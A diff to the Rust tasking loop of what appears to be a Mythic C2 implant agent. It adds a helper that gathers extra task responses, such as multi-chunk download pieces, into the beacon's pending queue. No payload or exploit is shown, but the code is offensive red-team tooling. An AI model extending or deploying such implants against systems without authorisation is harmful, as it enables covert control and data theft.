@@ -13,7 +13,9 @@ use uuid::Uuid;
 use crate::config::Config;
 use crate::sys::metadata;
 use crate::tasks;
-use crate::{DEBUG, EXIT_PROCESS, INTERVAL, JITTER, KILLDATE, SHOULD_EXIT, set_killdate, set_sleep};
+use crate::{
+    DEBUG, EXIT_PROCESS, INTERVAL, JITTER, KILLDATE, SHOULD_EXIT, set_killdate, set_sleep, take_extra,
+};
 
 // ── Helpers ─────────────────────────────────────────────
 
@@ -22,6 +24,17 @@ fn safe_dispatch(task: &mythic::TaskMessage) -> TaskResponse {
     let t = task.clone();
     catch_unwind(move || tasks::dispatch(&t))
         .unwrap_or_else(|_| TaskResponse::failed(task.id, "task handler panicked"))
+}
+
+/// Run a handler and return its primary response plus any extra responses
+/// pushed via `crate::push_extra` (e.g. multi-chunk download chunks).
+fn safe_dispatch_with_extras(task: &mythic::TaskMessage) -> Vec<TaskResponse> {
+    let primary = safe_dispatch(task);
+    let extras = take_extra();
+    let mut out = Vec::with_capacity(1 + extras.len());
+    out.push(primary);
+    out.extend(extras);
+    out
 }
 
 fn get_agent<C: C2Transport>(payload_uuid: Uuid, c2s: &[C]) -> MythicResult<MythicAgent> {
@@ -163,7 +176,7 @@ pub fn run(config: Config) -> MythicResult<()> {
         info!("task: {:?}", tasking);
     }
     for t in &tasking.tasks {
-        pending.push(safe_dispatch(t));
+        pending.extend(safe_dispatch_with_extras(t));
     }
     if SHOULD_EXIT.load(Ordering::Acquire) {
         let c2 = profiles.choose(&mut rng).unwrap();
@@ -193,7 +206,7 @@ pub fn run(config: Config) -> MythicResult<()> {
                     info!("task: {:?}", tasking);
                 }
                 for t in &tasking.tasks {
-                    pending.push(safe_dispatch(t));
+                    pending.extend(safe_dispatch_with_extras(t));
                 }
                 if SHOULD_EXIT.load(Ordering::Acquire) {
                     let c2 = profiles.choose(&mut rng).unwrap();
